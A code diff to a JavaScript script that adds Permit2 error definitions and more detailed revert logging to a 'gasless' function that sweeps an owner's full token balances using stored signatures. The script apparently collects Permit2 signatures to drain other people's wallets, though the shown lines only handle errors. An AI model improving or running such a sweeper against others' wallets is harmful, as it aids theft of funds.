@@ -196,6 +196,11 @@ const PERMIT2_ABI = [
 // Batch SignatureTransfer — separate ABI to avoid overload ambiguity with ethers.js
 const PERMIT2_BATCH_TRANSFER_ABI = [
   "function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes calldata signature) external",
+  // Custom errors — required for ethers v6 to decode revert reasons
+  "error InvalidNonce()",
+  "error SignatureExpired(uint256 signatureDeadline)",
+  "error InvalidAmount(uint256 maxAmount)",
+  "error LengthMismatch()",
 ];
 
 // ── Wallet & contracts ────────────────────────────────────────────────────────
@@ -1746,10 +1751,19 @@ async function sweep(wallet) {
             .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
         }
       } catch (e) {
-        err(`[gasless] ❌ revert: ${e.reason ?? e.message}`);
-        const msg = e.reason ?? e.message ?? "";
-        if (msg.includes("nonce") || msg.includes("InvalidNonce") || msg.includes("NonceAlreadyUsed")) {
-          log(`[gasless] nonce spent — marking for re-activation`);
+        // Decode Permit2 custom errors (InvalidNonce, InvalidAmount, SignatureExpired, LengthMismatch)
+        const revertName = e.revert?.name ?? e.data?.slice(0, 10) ?? null;
+        const errDetail  = revertName ?? e.reason ?? e.shortMessage ?? e.message;
+        err(`[gasless] ❌ revert: ${errDetail}`);
+        // Log diagnostic context on first failure so the cause is identifiable
+        if (revertName) {
+          err(`[gasless] revert args: ${JSON.stringify(e.revert?.args ?? [])}`);
+        }
+        err(`[gasless] context: owner=${checksum} nonce=${sig.nonce?.slice?.(0,18)} deadline=${dl} tokens=${withBalance.length} amounts=${withBalance.map(t=>t.balance).join(',')}`);
+        const msg = (revertName ?? e.reason ?? e.message ?? "").toLowerCase();
+        const isNonce = msg.includes("invalidnonce") || msg.includes("nonce");
+        if (isNonce) {
+          log(`[gasless] nonce already used on-chain — marking sig spent, needs re-activation`);
           if (supabase) {
             await supabase.from("permit2_signatures").update({ spent: true })
               .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
